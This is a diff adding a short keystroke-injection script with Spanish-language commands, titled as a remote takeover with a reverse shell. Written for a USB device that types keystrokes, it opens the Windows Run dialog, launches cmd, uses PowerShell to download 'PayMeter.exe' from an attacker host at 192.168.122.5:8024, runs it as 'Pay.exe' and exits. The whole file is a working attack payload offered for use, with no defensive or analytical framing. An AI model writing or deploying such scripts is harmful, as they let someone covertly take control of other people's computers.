@@ -1,0 +1,17 @@
+; Ejecución Toma Remota con Shell-Inverso
+
+PAUSA 2500
+; Abrimos un PROMPT
+KEY LEFT_GUI
+CADENA r
+PAUSA 200
+SUELTA
+
+; Ejecutamos Powershell con download para traer fichero
+CMD cmd
+PAUSA 2500
+CMD powershell -nop -c "(new-object Net.WebClient).DownloadFile('http://192.168.122.5:8024/PayMeter.exe','Pay.exe')"
+PAUSA 2500
+CMD Pay.exe
+CMD exit
+
